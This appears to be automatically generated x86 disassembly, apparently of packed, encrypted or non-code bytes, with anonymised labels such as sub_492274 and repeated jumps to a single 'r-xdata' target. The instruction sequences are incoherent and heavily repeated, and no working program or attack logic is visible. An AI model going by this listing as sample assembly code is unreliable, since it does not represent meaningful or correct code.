jle r-xdata
dec edx
push 0x76139868
jae r-xdata
retn 0x7b1c
push 0x97ff0768
xchg esi eax
xchg edi eax
xchg edi eax
std
or [ eax + 0x68 ] ch
pop es
jle r-xdata
inc eax
push 0x7070768
pop es
pop es
int1
push ds
0xcc77
jle r-xdata
push 0xdaae5ea4
fwait
jle r-xdata
jle r-xdata
dec esi
pop es
jle r-xdata
push 0x7070768
or eax 0xfdc46868
and ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
int1
push ds
0x7e411c79 0x4af7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xda
lahf
sbb ah dl
xchg [ edi + 0x64 ] edi
outsd
push 0x7070768
pop es
pop es
pop es
pop es
push 0x7f7e87c1
jl r-xdata
inc ebx
push 0x5a7e63e2
popad
push 0x7e511c68
daa
push 0x2b116868
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
or al 0x68
push 0x7070707
pop es
pop es
sahf
xchg edi eax
xchg edi eax
pushfd
push es
push 0x58ff0768
jl r-xdata
jg r-xdata
push 0x7070707
pop es
pop es
pop es
push 0xca1ec7e1
pop es
pop es
jg r-xdata
pop es
add ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7ec1fd53 0x1a13
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fiadd [ edi - 0x32 ]
std
loopne r-xdata
push ds
fiadd [ ebp - 0x32 ]
jle r-xdata
add ch [ eax + 0x68 ]
retn 0xae7e
jns r-xdata
push 0x7070768
or eax 0x7ece6868
scasb [ edi ]
push esi
push 0x7070768
pop es
pop es
pop es
pop es
sbb al 0x67
jle r-xdata
push 0x7070768
nop
xchg edi eax
xchg edi eax
xchg edi eax
push ds
shr [ ebx - 0x5c ] cl
push edi
jle r-xdata
push ds
ror ebx 0x1
jg r-xdata
dec ecx
xor [ eax + 0x68 ] ebp
jle r-xdata
push ds
shl [ ebx - 0x31 ] cl
int1
push ds
shl [ ecx - 0x3 ] cl
cmc
jle r-xdata
adc [ edi - 0x69 ] ebp
xchg edi eax
xchg edi eax
jg r-xdata
cmp [ eax + 0x68 ] ebp
pop es
pop es
jle r-xdata
sbb al 0x51
jle r-xdata
push edi
push 0x1a4a7e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jg r-xdata
iretd
xor [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x55 ] 0x8
push 0x7070768
punpckhbw mm5 [ eax + 0x7 ]
pop es
pop es
jle r-xdata
sbb al 0xda
imul edx [ esi + edx * 2 ] 0xffffff83
jle r-xdata
sub [ eax + 0x68 ] ch
adc al 0x53
scasb [ edi ]
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
push edi
xchg edi eax
xchg edi eax
xchg ebx eax
xchg edi eax
xchg edi eax
std
sar [ esi + 0x13 ] 0x1a
push 0x1c070768
jpo r-xdata
pushad
push 0x7070768
push edi
push 0x29af7e68
push 0x7070768
pop es
pop es
pop es
push ds
adc dl [ edi - 0x68 ]
adc cl [ ecx + 0x31 ]
push 0x31057e68
push 0xcf070768
std
loope r-xdata
pop es
pop es
pop es
dec ecx
push 0x7070768
pop es
pop es
jle r-xdata
or al 0x68
push 0x7070707
test [ eax ] 0x68
push 0x4e5e7e07
jle r-xdata
adc al 0xf2
imul edx [ edi + 0x567ea7fd ] 0x3e
push 0x7070768
rol eax 0x1e
shr [ ebx + 0x7e ] cl
je r-xdata
push 0x671a1a68
insb
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
xor edi [ edi - 0x59 ]
or [ eax + 0x68 ] ch
pop es
pop es
pop es
push 0x611c7e68
push 0x7f070768
mov edx [ esi + 0x68 ]
push 0x680a507e
push 0x977df7aa
sbb ah [ edi + 0x6c ]
or al 0x68
push 0x7ea72098
add [ edx + 0x68 ] esp
push 0xc27e0707
daa
push 0x7e070768
retn 0x6847

sbb al 0x46
jle r-xdata
push 0x68060c7e
push 0x3e651498
push 0x6bda1c68
adc al 0x56
cmp [ esi + 0x2a ] 0xc
push 0x7070768
pop es
cmp [ eax + 0x68 ] ebp
sbb bl [ edx ]
insb
dec esi
push 0x14070768
jpo r-xdata
adc edx [ edi - 0x3f979789 ]
jle r-xdata
jle r-xdata
push 0x7070707
pop es
jg r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x5f
jle r-xdata
sbb eax 0x277e6868
dec ecx
push 0x7e57a468
xchg edi eax
cwde
adc [ eax + 0x197e6868 ] cl
add eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x51
jle r-xdata
idiv [ ebp - 0x69 ]
xor [ eax + 0x68 ] ch
jle r-xdata
aam 0x6f
dec esp
jle r-xdata
add [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
std
test ch 0xfd
loope r-xdata
shl [ ebx ] cl
jg r-xdata
xor al 0x68
push 0x6bd26807
jle r-xdata
movsb [ edi ] [ esi ]
dec ecx
push 0x7070768
std
mov bh 0xc0
jle r-xdata
push 0x7b140707
fwait
std
pop es
adc al 0x53
xlat
jle r-xdata
sbb [ eax + 0x68 ] ebp
adc dl [ edi + 0x7e ]
mov esp 0x7686806
pop es
pop es
pop es
pop es
pop es
pop es
nop
xchg edi eax
xchg edi eax
jg r-xdata
pop es
sbb eax 0xab7ead83
and al 0x68
push 0x59c97f07
push 0xa7ec768
jo r-xdata
push 0x7070768
push 0xd47e57a4
outsd
push 0xf1401c68
push 0x7070707
pop es
pop es
jle r-xdata
push 0x1a070707
rcl [ ebx ] cl
jle r-xdata
pop es
pop es
pop es
pop es
inc ecx
push 0x1cc20768
jpo r-xdata
pop es
push 0x7076868
pop es
int1
lodsb [ esi ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov bh 0x7e
dec [ ebx + 0x68 ]
push 0xad831d07
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push cs
push 0x7070768
pop es
pop es
enter 0xa07e 0x63
push 0x7070768
pop es
push ds
rcr [ ebx + 0x7e ] cl
test eax 0x7686825
pop es
pop es
jg r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
sbb ch [ eax + 0x68 ]
pop es
push 0x97973b82
xchg edi eax
push 0x7070768
pop es
pop es
pop es
jb r-xdata
adc ah [ ecx - 0x68 ]
adc edi ebx
add [ eax + 0x68 ] ebp
jle r-xdata
pop es
cwde
adc ah [ eax + 0x1c686804 ]
inc eax
int1
sub ch [ eax + 0x68 ]
jle r-xdata
jg r-xdata
sub [ eax + 0x68 ] ebp
dec esp
loop r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcd55
xchg ebp eax
xchg edi eax
pop es
pop es
push eax
shl [ ebx - 0x24 ] cl
rcr edx 0xdc
jle r-xdata
je r-xdata
push 0x687def7e
sub [ eax + 0x68 ] ebp
jle r-xdata
pop es
pop es
pop es
jle r-xdata
sahf
pop esi
push 0x5e126868
jle r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070768
cwde
adc eax 0x68681bb6
rcl [ eax + ebp * 2 ] 0x1
xchg esp eax
jle r-xdata
push 0x687b0e7f
push 0x5e9e7ece
jge r-xdata
xor [ eax + 0x68 ] ebp
pop es
pop es
push eax
rcr [ edi - 0x19 ] cl
in eax 0xfb
pop es
pop es
jle r-xdata
sbb eax 0x7076868
pop es
dec edx
push 0x7070768
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx + 0x6a ]
push 0x42407e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg ebx eax
xchg edi eax
xchg edi eax
sub_492274
std
out dx eax
jle r-xdata
0x34e67e7f 0x6868
xchg ebx eax
xchg edi eax
xchg edi eax
jle r-xdata
cwde
adc esi [ esi + 0x73 ]
push 0xae5ea468
ficomp [ ebx + 0x6823e77e ]
push 0x7070707
int1
push ds
0x7e411c79 0x4af7
pop eax
push 0x7070768
jle r-xdata
or [ eax + 0x68 ] ch
pop es
jle r-xdata
inc eax
push 0x7070768
pop es
pop es
int1
push ds
0xcc77
jle r-xdata
dec esi
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xda
lahf
sbb ah dl
xchg [ edi + 0x64 ] edi
outsd
push 0x7070768
pop es
pop es
pop es
pop es
push 0x7f7e87c1
jl r-xdata
inc ebx
push 0x5a7e63e2
popad
push 0x7e511c68
daa
push 0x2b116868
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pushfd
push es
push 0x58ff0768
jl r-xdata
jg r-xdata
push 0x7070707
pop es
pop es
pop es
push 0xca1ec7e1
or al 0x68
push 0x7070707
pop es
pop es
pop es
jg r-xdata
pop es
add ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7ec1fd53 0x1a13
add ch [ eax + 0x68 ]
retn 0xae7e
jns r-xdata
push 0x7070768
or eax 0x7ece6868
scasb [ edi ]
push esi
push 0x7070768
pop es
pop es
pop es
pop es
sbb al 0x67
jle r-xdata
xchg edi eax
push ds
shr [ ebx - 0x5c ] cl
push edi
jle r-xdata
push ds
ror ebx 0x1
jg r-xdata
dec ecx
xor [ eax + 0x68 ] ebp
jle r-xdata
push ds
shl [ ebx - 0x31 ] cl
int1
push ds
shl [ ecx - 0x3 ] cl
cmc
jle r-xdata
adc [ edi - 0x69 ] ebp
xchg edi eax
xchg edi eax
jg r-xdata
cmp [ eax + 0x68 ] ebp
pop es
pop es
jle r-xdata
sbb al 0x51
jle r-xdata
push edi
push 0x1a4a7e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jg r-xdata
iretd
xor [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x55 ] 0x8
push 0x7070768
punpckhbw mm5 [ eax + 0x7 ]
pop es
pop es
jle r-xdata
sbb al 0xda
imul edx [ esi + edx * 2 ] 0xffffff83
jle r-xdata
sub [ eax + 0x68 ] ch
adc al 0x53
scasb [ edi ]
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
push edi
xchg edi eax
xchg edi eax
xchg ebx eax
xchg edi eax
xchg edi eax
std
sar [ esi + 0x13 ] 0x1a
push 0x1c070768
jpo r-xdata
pushad
push 0x7070768
pop es
jle r-xdata
push edi
push 0x29af7e68
push 0x7070768
pop es
pop es
pop es
push ds
adc dl [ edi - 0x68 ]
adc cl [ ecx + 0x31 ]
push 0x31057e68
push 0xcf070768
std
loope r-xdata
pop es
pop es
pop es
dec ecx
push 0x7070768
pop es
pop es
jle r-xdata
or al 0x68
push 0x7070707
push 0x7070768
test [ eax ] 0x68
push 0x4e5e7e07
adc al 0xf2
imul edx [ edi + 0x567ea7fd ] 0x3e
push 0x7070768
jle r-xdata
rol eax 0x1e
shr [ ebx + 0x7e ] cl
je r-xdata
push 0x671a1a68
insb
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
xor edi [ edi - 0x59 ]
or [ eax + 0x68 ] ch
pop es
pop es
pop es
push 0x611c7e68
push 0x7f070768
mov edx [ esi + 0x68 ]
push 0x680a507e
push 0x977df7aa
sbb ah [ edi + 0x6c ]
or al 0x68
push 0x7ea72098
add [ edx + 0x68 ] esp
push 0xc27e0707
daa
push 0x7e070768
retn 0x6847
pop es
sahf
xchg edi eax
xchg edi eax

sbb al 0x46
jle r-xdata
push 0x68060c7e
push 0x3e651498
push 0x6bda1c68
adc al 0x56
cmp [ esi + 0x2a ] 0xc
push 0x7070768
pop es
cmp [ eax + 0x68 ] ebp
sbb bl [ edx ]
insb
dec esi
push 0x14070768
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fiadd [ edi - 0x32 ]
std
loopne r-xdata
push ds
fiadd [ ebp - 0x32 ]
jle r-xdata
adc edx [ edi - 0x3f979789 ]
jle r-xdata
jle r-xdata
nop
xchg edi eax
xchg edi eax
push 0x7070707
pop es
jg r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x5f
jle r-xdata
sbb eax 0x277e6868
dec ecx
push 0x7e57a468
xchg edi eax
cwde
adc [ eax + 0x197e6868 ] cl
add eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x51
jle r-xdata
idiv [ ebp - 0x69 ]
xor [ eax + 0x68 ] ch
jle r-xdata
aam 0x6f
dec esp
jle r-xdata
add [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
std
test ch 0xfd
loope r-xdata
shl [ ebx ] cl
jg r-xdata
xor al 0x68
push 0x6bd26807
jle r-xdata
movsb [ edi ] [ esi ]
dec ecx
push 0x7070768
std
mov bh 0xc0
jle r-xdata
push 0x7b140707
fwait
std
pop es
adc al 0x53
xlat
jle r-xdata
sbb [ eax + 0x68 ] ebp
adc dl [ edi + 0x7e ]
mov esp 0x7686806
pop es
pop es
pop es
pop es
pop es
pop es
nop
xchg edi eax
xchg edi eax
jg r-xdata
pop es
sbb eax 0xab7ead83
and al 0x68
push 0x59c97f07
push 0xa7ec768
jo r-xdata
push 0x7070768
push 0xd47e57a4
outsd
push 0xf1401c68
push 0x7070707
pop es
pop es
jle r-xdata
push 0x1a070707
rcl [ ebx ] cl
jle r-xdata
pop es
pop es
pop es
pop es
inc ecx
push 0x1cc20768
jpo r-xdata
pop es
push 0x7076868
pop es
int1
lodsb [ esi ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov bh 0x7e
dec [ ebx + 0x68 ]
push 0xad831d07
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push cs
push 0x7070768
pop es
pop es
enter 0xa07e 0x63
push 0x7070768
pop es
push ds
rcr [ ebx + 0x7e ] cl
test eax 0x7686825
pop es
pop es
jg r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
sbb ch [ eax + 0x68 ]
pop es
push 0x97973b82
xchg edi eax
push 0x7070768
pop es
pop es
pop es
jb r-xdata
adc ah [ ecx - 0x68 ]
adc edi ebx
add [ eax + 0x68 ] ebp
jle r-xdata
pop es
cwde
adc ah [ eax + 0x1c686804 ]
inc eax
int1
sub ch [ eax + 0x68 ]
jle r-xdata
jg r-xdata
sub [ eax + 0x68 ] ebp
dec esp
loop r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcd55
xchg ebp eax
xchg edi eax
pop es
pop es
push eax
shl [ ebx - 0x24 ] cl
rcr edx 0xdc
jle r-xdata
je r-xdata
push 0x687def7e
sub [ eax + 0x68 ] ebp
jle r-xdata
pop es
pop es
pop es
jle r-xdata
sahf
pop esi
push 0x5e126868
jle r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070768
cwde
adc eax 0x68681bb6
rcl [ eax + ebp * 2 ] 0x1
xchg esp eax
jle r-xdata
push 0x687b0e7f
push 0x5e9e7ece
jge r-xdata
xor [ eax + 0x68 ] ebp
pop es
pop es
push eax
rcr [ edi - 0x19 ] cl
in eax 0xfb
pop es
pop es
jle r-xdata
sbb eax 0x7076868
pop es
dec edx
push 0x7070768
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx + 0x6a ]
push 0x42407e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg ebx eax
xchg edi eax
xchg edi eax
sub_492292
std
mov eax [ 0x7fea1ef1 ]
jle r-xdata
pop es
pop es
pop es
jle r-xdata
xor al 0x68
push 0x7070707
pop es
pop es
pop es
pop es
retn 0x7b1c
or [ eax + 0x68 ] ch
pop es
jle r-xdata
inc eax
push 0x7070768
pop es
pop es
int1
push ds
0xcc77
jle r-xdata
dec esi
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0xda
lahf
sbb ah dl
xchg [ edi + 0x64 ] edi
outsd
push 0x7070768
pop es
pop es
pop es
pop es
push 0x7f7e87c1
jl r-xdata
inc ebx
push 0x5a7e63e2
popad
push 0x7e511c68
daa
push 0x2b116868
xchg edi eax
xchg edi eax
xchg edi eax
jle r-xdata
pushfd
push es
push 0x58ff0768
jl r-xdata
jg r-xdata
push 0x7070707
pop es
pop es
pop es
push 0xca1ec7e1
or al 0x68
push 0x7070707
pop es
pop es
pop es
jg r-xdata
pop es
add ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
0x7ec1fd53 0x1a13
add ch [ eax + 0x68 ]
retn 0xae7e
jns r-xdata
push 0x7070768
or eax 0x7ece6868
scasb [ edi ]
push esi
push 0x7070768
pop es
pop es
pop es
pop es
sbb al 0x67
jle r-xdata
xchg edi eax
push ds
shr [ ebx - 0x5c ] cl
push edi
jle r-xdata
push ds
ror ebx 0x1
jg r-xdata
dec ecx
xor [ eax + 0x68 ] ebp
jle r-xdata
push ds
shl [ ebx - 0x31 ] cl
int1
push ds
shl [ ecx - 0x3 ] cl
cmc
jle r-xdata
adc [ edi - 0x69 ] ebp
xchg edi eax
xchg edi eax
jg r-xdata
cmp [ eax + 0x68 ] ebp
pop es
pop es
jle r-xdata
sbb al 0x51
jle r-xdata
push edi
push 0x1a4a7e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
jg r-xdata
iretd
xor [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x55 ] 0x8
push 0x7070768
punpckhbw mm5 [ eax + 0x7 ]
pop es
pop es
jle r-xdata
sbb al 0xda
imul edx [ esi + edx * 2 ] 0xffffff83
jle r-xdata
sub [ eax + 0x68 ] ch
adc al 0x53
scasb [ edi ]
cmp ebp [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
push edi
xchg edi eax
xchg edi eax
xchg ebx eax
xchg edi eax
xchg edi eax
std
sar [ esi + 0x13 ] 0x1a
push 0x1c070768
jpo r-xdata
pushad
push 0x7070768
pop es
jle r-xdata
push edi
push 0x29af7e68
push 0x7070768
pop es
pop es
pop es
push ds
adc dl [ edi - 0x68 ]
adc cl [ ecx + 0x31 ]
push 0x31057e68
push 0xcf070768
std
loope r-xdata
pop es
pop es
pop es
dec ecx
push 0x7070768
pop es
pop es
jle r-xdata
or al 0x68
push 0x7070707
push 0x7070768
test [ eax ] 0x68
push 0x4e5e7e07
adc al 0xf2
imul edx [ edi + 0x567ea7fd ] 0x3e
push 0x7070768
jle r-xdata
rol eax 0x1e
shr [ ebx + 0x7e ] cl
je r-xdata
push 0x671a1a68
insb
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
xor edi [ edi - 0x59 ]
or [ eax + 0x68 ] ch
pop es
pop es
pop es
push 0x611c7e68
push 0x7f070768
mov edx [ esi + 0x68 ]
push 0x680a507e
push 0x977df7aa
sbb ah [ edi + 0x6c ]
or al 0x68
push 0x7ea72098
add [ edx + 0x68 ] esp
push 0xc27e0707
daa
push 0x7e070768
retn 0x6847
pop es
sahf
xchg edi eax
xchg edi eax

sbb al 0x46
jle r-xdata
push 0x68060c7e
push 0x3e651498
push 0x6bda1c68
adc al 0x56
cmp [ esi + 0x2a ] 0xc
push 0x7070768
pop es
cmp [ eax + 0x68 ] ebp
sbb bl [ edx ]
insb
dec esi
push 0x14070768
jpo r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
fiadd [ edi - 0x32 ]
std
loopne r-xdata
push ds
fiadd [ ebp - 0x32 ]
jle r-xdata
adc edx [ edi - 0x3f979789 ]
jle r-xdata
jle r-xdata
nop
xchg edi eax
xchg edi eax
push 0x7070707
pop es
jg r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x5f
jle r-xdata
sbb eax 0x277e6868
dec ecx
push 0x7e57a468
xchg edi eax
cwde
adc [ eax + 0x197e6868 ] cl
add eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x51
jle r-xdata
idiv [ ebp - 0x69 ]
xor [ eax + 0x68 ] ch
jle r-xdata
aam 0x6f
dec esp
jle r-xdata
add [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
std
test ch 0xfd
loope r-xdata
shl [ ebx ] cl
jg r-xdata
xor al 0x68
push 0x6bd26807
jle r-xdata
movsb [ edi ] [ esi ]
dec ecx
push 0x7070768
std
mov bh 0xc0
jle r-xdata
push 0x7b140707
fwait
std
pop es
adc al 0x53
xlat
jle r-xdata
sbb [ eax + 0x68 ] ebp
adc dl [ edi + 0x7e ]
mov esp 0x7686806
pop es
pop es
pop es
pop es
pop es
pop es
nop
xchg edi eax
xchg edi eax
jg r-xdata
pop es
sbb eax 0xab7ead83
and al 0x68
push 0x59c97f07
push 0xa7ec768
jo r-xdata
push 0x7070768
push 0xd47e57a4
outsd
push 0xf1401c68
push 0x7070707
pop es
pop es
jle r-xdata
push 0x1a070707
rcl [ ebx ] cl
jle r-xdata
pop es
pop es
pop es
pop es
inc ecx
push 0x1cc20768
jpo r-xdata
pop es
push 0x7076868
pop es
int1
lodsb [ esi ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov bh 0x7e
dec [ ebx + 0x68 ]
push 0xad831d07
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push cs
push 0x7070768
pop es
pop es
enter 0xa07e 0x63
push 0x7070768
pop es
push ds
rcr [ ebx + 0x7e ] cl
test eax 0x7686825
pop es
pop es
jg r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
sbb ch [ eax + 0x68 ]
pop es
push 0x97973b82
xchg edi eax
push 0x7070768
pop es
pop es
pop es
jb r-xdata
adc ah [ ecx - 0x68 ]
adc edi ebx
add [ eax + 0x68 ] ebp
jle r-xdata
pop es
cwde
adc ah [ eax + 0x1c686804 ]
inc eax
int1
sub ch [ eax + 0x68 ]
jle r-xdata
jg r-xdata
sub [ eax + 0x68 ] ebp
dec esp
loop r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcd55
xchg ebp eax
xchg edi eax
pop es
pop es
push eax
shl [ ebx - 0x24 ] cl
rcr edx 0xdc
jle r-xdata
je r-xdata
push 0x687def7e
sub [ eax + 0x68 ] ebp
jle r-xdata
pop es
pop es
pop es
jle r-xdata
sahf
pop esi
push 0x5e126868
jle r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070768
cwde
adc eax 0x68681bb6
rcl [ eax + ebp * 2 ] 0x1
xchg esp eax
jle r-xdata
push 0x687b0e7f
push 0x5e9e7ece
jge r-xdata
xor [ eax + 0x68 ] ebp
pop es
pop es
push eax
rcr [ edi - 0x19 ] cl
in eax 0xfb
pop es
pop es
jle r-xdata
sbb eax 0x7076868
pop es
dec edx
push 0x7070768
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx + 0x6a ]
push 0x42407e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg ebx eax
xchg edi eax
xchg edi eax
sub_492429
push ds
adc [ ebx - 0x69 ] esp
xchg edi eax
xchg edi eax
push [ edx ]
adc eax [ cs : edx + 0x6847847e ]
push 0x6871f17e
push 0x12070707
push edi
cwde
dec ecx
xor [ eax + 0x68 ] ebp
jle r-xdata
push ds
shl [ ebx - 0x31 ] cl
int1
push ds
shl [ ecx - 0x3 ] cl
cmc
jle r-xdata
iretd
xor [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
sar [ esi + 0x55 ] 0x8
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
xor edi [ edi - 0x59 ]
punpckhbw mm5 [ eax + 0x7 ]
pop es
pop es
jle r-xdata
adc cl [ ecx + 0x31 ]
push 0x31057e68
push 0xcf070768
std
loope r-xdata
pop es
pop es
pop es
adc dl [ edi - 0x68 ]
dec ecx
push 0x7070768
pop es
pop es
rol eax 0x1e
shr [ ebx + 0x7e ] cl
je r-xdata

push 0x68060c7e
push 0x3e651498
push 0x6bda1c68
adc al 0x56
cmp [ esi + 0x2a ] 0xc
push 0x7070768
pop es
sbb al 0x46
jle r-xdata
sbb ah [ edi + 0x6c ]
or al 0x68
push 0x7ea72098
add [ edx + 0x68 ] esp
push 0xc27e0707
daa
push 0x7e070768
retn 0x6847
push 0x611c7e68
push 0x7f070768
mov edx [ esi + 0x68 ]
push 0x680a507e
push 0x977df7aa
cmp [ eax + 0x68 ] ebp
sbb bl [ edx ]
insb
dec esi
push 0x14070768
jpo r-xdata
adc edx [ edi - 0x3f979789 ]
jle r-xdata
jle r-xdata
push 0x7070707
pop es
jg r-xdata
jne r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x5f
jle r-xdata
sbb eax 0x277e6868
dec ecx
push 0x7e57a468
xchg edi eax
cwde
adc [ eax + 0x197e6868 ] cl
add eax 0x7076868
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
sbb al 0x51
jle r-xdata
idiv [ ebp - 0x69 ]
xor [ eax + 0x68 ] ch
jle r-xdata
aam 0x6f
dec esp
jle r-xdata
add [ eax + 0x68 ] ebp
pop es
pop es
pop es
pop es
pop es
std
test ch 0xfd
loope r-xdata
shl [ ebx ] cl
jg r-xdata
xor al 0x68
push 0x6bd26807
jle r-xdata
movsb [ edi ] [ esi ]
dec ecx
push 0x7070768
std
mov bh 0xc0
jle r-xdata
push 0x7b140707
fwait
std
pop es
adc al 0x53
xlat
jle r-xdata
sbb [ eax + 0x68 ] ebp
adc dl [ edi + 0x7e ]
mov esp 0x7686806
pop es
pop es
pop es
pop es
pop es
pop es
nop
xchg edi eax
xchg edi eax
jg r-xdata
pop es
sbb eax 0xab7ead83
and al 0x68
push 0x59c97f07
push 0xa7ec768
jo r-xdata
push 0x7070768
push 0xd47e57a4
outsd
push 0xf1401c68
push 0x7070707
pop es
pop es
jle r-xdata
push 0x1a070707
rcl [ ebx ] cl
jle r-xdata
pop es
pop es
pop es
pop es
inc ecx
push 0x1cc20768
jpo r-xdata
pop es
push 0x7076868
pop es
int1
lodsb [ esi ]
jle r-xdata
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
mov bh 0x7e
dec [ ebx + 0x68 ]
push 0xad831d07
jle r-xdata
xchg edi eax
xchg edi eax
xchg edi eax
pop es
pop es
pop es
pop es
pop es
jg r-xdata
push cs
push 0x7070768
pop es
pop es
enter 0xa07e 0x63
push 0x7070768
pop es
push ds
rcr [ ebx + 0x7e ] cl
test eax 0x7686825
pop es
pop es
jg r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
jle r-xdata
sbb ch [ eax + 0x68 ]
pop es
push 0x97973b82
xchg edi eax
push 0x7070768
pop es
pop es
pop es
jb r-xdata
adc ah [ ecx - 0x68 ]
adc edi ebx
add [ eax + 0x68 ] ebp
jle r-xdata
pop es
cwde
adc ah [ eax + 0x1c686804 ]
inc eax
int1
sub ch [ eax + 0x68 ]
jle r-xdata
jg r-xdata
sub [ eax + 0x68 ] ebp
dec esp
loop r-xdata
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
int1
push ds
retn 0xcd55
xchg ebp eax
xchg edi eax
pop es
pop es
push eax
shl [ ebx - 0x24 ] cl
rcr edx 0xdc
jle r-xdata
je r-xdata
push 0x687def7e
sub [ eax + 0x68 ] ebp
jle r-xdata
pop es
pop es
pop es
jle r-xdata
sahf
pop esi
push 0x5e126868
jle r-xdata
xchg edi eax
pop es
pop es
jle r-xdata
push 0x7070768
cwde
adc eax 0x68681bb6
rcl [ eax + ebp * 2 ] 0x1
xchg esp eax
jle r-xdata
push 0x687b0e7f
push 0x5e9e7ece
jge r-xdata
xor [ eax + 0x68 ] ebp
pop es
pop es
push eax
rcr [ edi - 0x19 ] cl
in eax 0xfb
pop es
pop es
jle r-xdata
sbb eax 0x7076868
pop es
dec edx
push 0x7070768
jle r-xdata
push 0x7070707
pop es
pop es
pop es
pop es
les ebx [ edx ]
adc bh [ ebx + 0x6a ]
push 0x42407e68
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
pop es
xchg ebx eax
xchg edi eax
xchg edi eax
sub_4924af
push 0x7070707
pop es
sar [ esi + 0x55 ] 0x8
push 0x7070768
pop es
pop es
pop es
pop es
pop es
pop es
sbb dl dl
xor edi [ edi - 0x59 ]
sbb [ eax + 0x68 ] ebp
adc dl [ edi + 0x7e ]
mov esp 0x7686806
pop es
pop es
pop es
pop es
pop es
pop es
rol eax 0x1e
shr [ ebx + 0x7e ] cl

sub_4926d1
push 0xbd7e9be2
push 0x7070768
pop es
pop es
jle r-xdata
push 0x682d5e7e
push 0x12980707
mov al [ 0x1c686804 ]
sbb ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
pop es
pop es
inc ecx
push 0x1cc20768
jpo r-xdata
pop es
pop es
jle r-xdata
push ds
rcr [ ebx + 0x7e ] cl
test eax 0x7686825
pop es
pop es
jg r-xdata
and ch [ eax + 0x68 ]
pop es
pop es
pop es
pop es
